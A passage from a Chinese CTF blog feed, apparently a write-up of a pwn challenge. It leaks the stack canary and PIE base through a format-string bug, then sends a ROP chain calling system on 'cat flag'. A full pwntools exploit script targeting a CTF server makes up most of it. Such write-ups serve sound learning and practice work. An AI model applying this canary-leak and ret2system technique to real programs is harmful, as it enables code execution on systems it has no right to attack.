下面刚好有一个我们能泄露函数基址，但是为什么是他呢？</p>\n<p>考虑因为这个地址代表了我们的 main 函数结尾的一个部分的地址，我们可以通过这个地址进而计算出栈的基址。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211705133.png\" alt=\"image-20230609211705133\"></p>\n<p>接下来就是确定偏移了（须注意的一点就是需要在 gets 函数输入后，在查看栈的情况，这样更好确定。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211905134.png\" alt=\"image-20230609211905134\"></p>\n<h3 id=\"exp构造环节\"><a class=\"markdownIt-Anchor\" href=\"#exp构造环节\">#</a> exp 构造环节:</h3>\n<p>既然我们找到了，我们就构造 payload1 去泄露 canary 和基址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>paylaod1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>在构造 rop 链的准备。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span> <span class=\"token comment\"># robata 中的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr></table></figure><h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> local<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tp <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.anna.nssctf.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28068</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'you, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'---'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#ropgadget</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'else? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609212855635.png\" alt=\"image-20230609212855635\"></p>\n",
            "tags": [
                "canary",
                "pie",
                "格式化字符串漏洞"
            ]
        }
    ]
}